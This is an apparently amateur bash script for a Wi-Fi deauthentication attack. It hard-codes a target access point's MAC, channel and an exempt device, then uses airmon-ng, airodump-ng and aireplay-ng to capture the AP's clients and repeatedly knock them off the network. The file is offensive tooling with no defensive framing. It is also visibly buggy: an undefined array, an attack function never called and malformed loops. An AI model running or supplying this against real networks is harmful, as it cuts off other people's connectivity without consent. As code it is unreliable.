pass="50:3E:AA:E3:3A:66"
ap="D8:9D:67:4D:EC:30"
channel="11"
interface="wlan0"
filename="rst-01.csv"
cooldown=15

declare -a address_array
declare -a date_array


round_get_data ()
{

    address_count=0
    date_count=0
    while read line
    do
        for word in $line
        do
            echo "dat ${word}"
            if [[ $word =~ ..\:..\:..\:..\:..\:..\,$ ]]
            then
                word=$( echo $word | sed 's/,//' )
                echo ">>>dis ${word}" >> resultat
                address_array[$address_count]=$word
                $((address_count++))
            fi

            if [[ $word =~ ....-..-..$ ]]
            then
                word=$( echo $word | sed 's/,//' )

                echo ">>>dis ${word}" >> resultat
                date_array[$date_count]=$word
            fi

            if [[ $word =~ ..\:..\:..\,$ ]]
            then
                word=$( echo $word | sed 's/,//' )

                echo ">>>dis ${word}" >> resultat
                date_array[$date_count]="${date_array[$date_count]} $word"
                date_array[$date_count]=$( date --date="${date_array[$date_count]}" +"%s" )
                $((date_count++))
            fi
        done
    done < $filename
    echo ${address_array[@]}
    echo ${date_array[@]}
}

round_target()
{
    client="$1"
    ap="$2"
    duration="$3"
    interface="$4"
    end=$((SECONDS+duration))
    echo $end
    while [ $SECONDS -lt $end ]
    do
        aireplay-ng -0 16 -a $ap -c $client $interface
    done
}

round ()
{
    address_count=0
    round_get_data

    for address in $address_array
    do
        if [[ $address == $pass ]] || [[ $address == $ap ]]
        then
            address_count=$(( address_count++ ))
            echo "long time no see" >> resultat

        else
            hour_count=$(( (address_count * 4) + 3 ))
            hour_current=$( date +%s )
            echo "hour count ${hour_count}" >> resultat
            echo "hour count ${hour_current}" >> resultat
            if [[ $(( $hour_current - ${hour_array[$hour_count]} )) -gt $cooldown ]]
            then
                echo "big cooldown man" >> resultat
            else
                echo "oi! ya git! cmere" >> resultat

            fi

        fi
    done
}

echo "check kill"
sudo airmon-ng check kill
echo "check kill ok"
echo "start"
sudo airmon-ng start $interface
echo "start ok"
echo "airodump"
sudo airodump-ng -d $ap -c $channel -w rst "${interface}mon" &
echo "airodump ok"

# address_count=0
# timestamp_count=0

round

address_count=0
date_count=0

